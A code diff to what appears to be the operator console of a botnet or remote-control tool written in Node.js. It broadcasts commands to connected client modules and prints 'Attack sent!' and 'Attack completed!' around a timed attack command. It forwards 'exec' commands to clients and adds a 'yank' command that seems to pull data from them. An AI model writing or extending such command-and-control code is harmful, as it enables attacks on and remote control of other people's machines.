@@ -1,6 +1,7 @@
 import readline from "readline";
 import fs from "fs";
 import { clientModules, broadcast } from "./server.js";
+import recieve from "./recieve.js";
 import help from "./help.json" assert { type: "json" };
 
 const rl = readline.createInterface({
@@ -86,7 +87,7 @@ export function prompt() {
 				);
 			} else if (commandArgs.firstArg !== undefined) {
 				broadcast(message);
-				console.log(` Attack sent!`);
+				console.log(`Attack sent!`);
 			}
 
 			let duration = commandArgs.thirdArg;
@@ -98,6 +99,16 @@ export function prompt() {
 			setTimeout(() => {
 				console.log("Attack completed!");
 			}, duration);
+		}
+
+		if (message.startsWith("yank")) {
+			if (message === "yank") console.log("Pease provide arguments:")
+
+			if (commandArgs.firstArg !== undefined) {
+				recieve(commandArgs.firstArg, commandArgs.secondArg);
+				broadcast(message);
+			}
+
 		}
 
 		if (message.startsWith("exec")) broadcast(message);
